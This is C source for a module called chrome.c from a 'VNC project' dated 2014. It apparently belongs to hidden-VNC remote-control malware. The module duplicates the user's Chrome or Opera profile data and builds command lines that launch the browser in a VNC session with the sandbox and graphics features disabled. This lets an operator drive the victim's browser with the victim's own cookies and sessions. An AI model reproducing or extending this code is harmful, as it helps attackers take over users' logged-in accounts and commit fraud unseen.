//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: chrome.c
// $Revision: 194 $
// $Date: 2014-07-11 16:55:06 +0400 (Пт, 11 июл 2014) $
// description: 
//	Chrome launch in VNC session support
//	The idea is to duplicate default user profile and launch chrome with temporary profile

#include "project.h"
#include <malloc.h>
#include "exec.h"
#include "copy.h"
#include "browser.h"
#include "rt\str.h"

#define CR_PREFIXW L"CR"
#define CR_PREFIXA "CR"
#ifdef UNICODE
	#define CR_PREFIX CR_PREFIXW
#else
	#define CR_PREFIX CR_PREFIXA
#endif

#define OPRN_PREFIXW L"OPRN"
#define OPRN_PREFIXA "OPRN"
#ifdef UNICODE
	#define OPRN_PREFIX OPRN_PREFIXW
#else
	#define OPRN_PREFIX OPRN_PREFIXA
#endif

#define CR_START_PROFILE_W  L" --user-data-dir="
#define CR_START_PROFILE_A  " --user-data-dir="

#define CR_TAIL_W L" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-threaded-compositing --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows"
#define CR_TAIL_A " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-threaded-compositing --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows"

#define CR_DATA_DIR_W       L"Google\\Chrome\\User Data"
#define CR_DATA_DIR_A       "Google\\Chrome\\User Data"

#define OPR_DATA_DIR_W       L"Opera Software\\Opera Stable"
#define OPR_DATA_DIR_A       "Opera Software\\Opera Stable"

#define BACK_SLASH L"\\"

// chrome and new opera (chrome clone)
// save data at different locations
// XP
// C:\Documents and Settings\Administrator\Local Settings\Application Data\Google\Chrome\User Data
// e.g. %USERPROFILE%\Local Settings\Application Data\Google\Chrome\User Data
// or %LOCALAPPDATA%\Google\Chrome\User Data (LOCALAPPDATA var can be absent on XP)
// 
// C:\Documents and Settings\Administrator\Application Data\Opera Software\Opera Stable
// e.g. %APPDATA%\Opera Software\Opera Stable
//
// Vista
// C:\Users\tor\AppData\Local\Google\Chrome\User Data
// e.g. %LOCALAPPDATA%\Google\Chrome\User Data
//
// C:\Users\tor\AppData\Roaming\Opera Software\Opera Stable
// e.g. %APPDATA%\Opera Software\Opera Stable

BOOL CR_CreateEvent(PVNC_SESSION pSession)
{
	return (BR_CreateEvent(pSession,CR_PREFIX)!=NULL);
}

BOOL CR_IsStarted(PVNC_SESSION pSession)
{
	return BR_IsStarted(pSession,CR_PREFIX);
}

BOOL OPRN_CreateEvent(PVNC_SESSION pSession)
{
	return (BR_CreateEvent(pSession,OPRN_PREFIX)!=NULL);
}

BOOL OPRN_IsStarted(PVNC_SESSION pSession)
{
	return BR_IsStarted(pSession,OPRN_PREFIX);
}


//////////////////////////////////////////////////////////////////////////
// returns cmdline arguments for new chrome instance

WINERROR CR_GetCommandLineW(PVNC_SESSION pSession, LPCWSTR szPath,LPWSTR *pNewCommandLine)
{
	WINERROR Error = NO_ERROR;

	if ( BR_IsCR() ){
		*pNewCommandLine = NULL;
		return NO_ERROR;
	}

	// validate path
	PathRemoveBlanksW((LPWSTR)szPath);
	PathRemoveArgsW((LPWSTR)szPath);

	return 
		BR_PrepareProfileAndGetCmdlineW(
			pSession,
			wczChrome,
			LAPP_DATA_VAR_W,
			CR_DATA_DIR_W,
			CR_PREFIXW,
			CR_START_PROFILE_W,
			CR_TAIL_W,
			pNewCommandLine
			);
}

WINERROR NewOPR_GetCommandLineW(PVNC_SESSION pSession, LPCWSTR szPath,LPWSTR *pNewCommandLine)
{
	WINERROR Error = NO_ERROR;

	if ( BR_IsOPR_NEW() ){
		*pNewCommandLine = NULL;
		return NO_ERROR;
	}

	// validate path
	PathRemoveBlanksW((LPWSTR)szPath);
	PathRemoveArgsW((LPWSTR)szPath);
	return 
		BR_PrepareProfileAndGetCmdlineW(
			pSession,
			wczOpera,
			APP_DATA_VAR_W,
			OPR_DATA_DIR_W,
			OPRN_PREFIXW,
			CR_START_PROFILE_W,
			CR_TAIL_W,
			pNewCommandLine
			);
}
//////////////////////////////////////////////////////////////////////////
// ansi version

WINERROR 
	CR_GetCommandLineA(
		PVNC_SESSION pSession, 
		LPCSTR szPath,
		LPSTR *pNewCommandLine
		)
{
	if ( BR_IsCR() ){
		*pNewCommandLine = NULL;
		return NO_ERROR;
	}

	return BR_GetCommandLineA(pSession,szPath,pNewCommandLine,CR_GetCommandLineW);
}

WINERROR 
	NewOPR_GetCommandLineA(
		PVNC_SESSION pSession, 
		LPCSTR szPath,
		LPSTR *pNewCommandLine
		)
{
	if ( BR_IsOPR_NEW() ){
		*pNewCommandLine = NULL;
		return NO_ERROR;
	}
	return BR_GetCommandLineA(pSession,szPath,pNewCommandLine,NewOPR_GetCommandLineW);
}